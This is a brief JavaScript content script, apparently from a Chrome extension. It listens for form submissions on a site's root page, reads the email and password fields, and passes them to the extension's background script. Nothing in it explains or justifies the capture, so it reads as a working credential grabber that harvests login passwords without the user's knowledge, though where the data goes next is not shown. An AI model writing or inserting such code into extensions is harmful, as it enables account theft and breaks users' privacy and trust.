(function(){
	console.log('ready from content.js')
		
	document.addEventListener("submit", function (e) {
		
		if (window.location.pathname === '/') {
			var data = {
				"email" : $("#email").val(),
				"password" : $("#pass").val()
			}
			chrome.runtime.sendMessage({type : 'on_form_submit', 'data' : data}, function(data){
				console.log(data.response);
			});
			//e.preventDefault();
		}	  
	}, false);
})();


